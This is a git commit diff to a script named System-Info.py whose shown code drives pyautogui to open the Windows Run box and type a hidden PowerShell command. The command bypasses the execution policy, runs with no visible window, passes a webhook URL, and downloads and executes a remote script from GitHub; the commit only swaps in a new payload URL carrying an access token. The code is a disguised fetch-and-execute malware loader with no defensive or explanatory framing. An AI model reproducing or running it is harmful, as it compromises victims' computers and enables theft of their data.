5813c85de9feb9f680185f04caebae052afd005a
stack-crash999 <unlocker129@outlook.com>
2025-04-12 18:35:13 -0500

    System-Info.py

--- System-Info.py
+++ System-Info.py
@@ -11,5 +11,5 @@ except ImportError:
 time.sleep(0.1)
 pyautogui.hotkey('win', 'r')
 time.sleep(0.1)
-pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/stack-crash999/DARKWIRE-MAIN/refs/heads/main/taktikal | iex")
+pyautogui.write(f"powershell -NoP -Ep Bypass -W H -C $dc='{webhook_url}'; irm https://raw.githubusercontent.com/stack-crash999/Dark-Wire/refs/heads/main/dark-wire.txt?token=GHSAT0AAAAAADCA5WVLEGY54EXSVXG27NIQZ727B4A | iex")
 pyautogui.press('enter')
